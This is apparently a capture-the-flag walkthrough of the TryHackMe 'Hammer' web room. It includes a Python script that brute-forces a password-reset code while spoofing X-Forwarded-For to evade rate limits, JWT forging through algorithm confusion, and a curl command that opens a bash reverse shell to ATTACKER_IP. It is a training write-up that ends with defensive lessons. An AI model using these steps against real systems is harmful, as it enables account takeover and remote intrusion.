# 🔨 Hammer

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Hammer](https://tryhackme.com/room/hammer) |
| **Difficulty** | 🟡 Medium |
| **Category** | Web |
| **OS** | Linux |
| **Tools** | nmap, ffuf, Burp Suite, curl, jwt_tool |

---

## 🎯 Objective

Bypass authentication via rate limit bypass, brute force recovery codes, and forge JWT tokens to achieve Remote Code Execution.

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV TARGET_IP
```

**Open ports:**
```
22/tcp   open  ssh
80/tcp   open  http
```

Directory fuzzing:
```bash
ffuf -u http://TARGET_IP/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

**Found:** Log files accessible — `/logs/` directory

Reading log files reveals email addresses:
```bash
curl http://TARGET_IP/logs/latest.log
# Found: tester@hammer.thm
```

---

## 💥 Exploitation — Rate Limit Bypass

The password reset page sends a 4-digit code to the email. Rate limiting blocks brute force — but the `X-Forwarded-For` header can be cycled to bypass it:

```python
import requests

url = "http://TARGET_IP/reset_password.php"
email = "tester@hammer.thm"

for code in range(1000, 10000):
    headers = {
        "X-Forwarded-For": f"1.1.1.{code % 256}"
    }
    data = {"email": email, "recovery_code": str(code)}
    r = requests.post(url, data=data, headers=headers)
    if "Invalid" not in r.text:
        print(f"Code found: {code}")
        break
```

Password reset successful — login granted.

---

## 🔑 JWT Forging for RCE

After login a JWT is issued. Inspecting the token:
```bash
# Decode JWT
echo "TOKEN" | cut -d. -f2 | base64 -d | python3 -m json.tool

# Payload reveals: {"role": "user", "cmd_allowed": false}
```

Checking if the server accepts `none` algorithm or RS256 with a weak key:
```bash
# Use jwt_tool
python3 jwt_tool.py TOKEN -T

# Forge with role: admin and cmd_allowed: true
python3 jwt_tool.py TOKEN -X a  # algorithm confusion attack
```

Submitting the forged token grants access to a command execution endpoint:
```bash
curl -H "Authorization: Bearer FORGED_TOKEN" \
  -d "cmd=id" http://TARGET_IP/execute
# Returns: uid=www-data
```

Getting reverse shell:
```bash
curl -H "Authorization: Bearer FORGED_TOKEN" \
  -d "cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'" \
  http://TARGET_IP/execute
```

---

## 📚 Lessons Learned

- Rate limiting based on IP alone is bypassable via `X-Forwarded-For` header manipulation
- JWT `none` algorithm and RS256/HS256 confusion attacks are critical vulnerabilities
- Log files should never be publicly accessible — they leak usernames, emails, and paths
- Always validate JWT signatures server-side using the correct algorithm and a strong secret

---
*by OwlRC 🦉 | github.com/OwlRC*
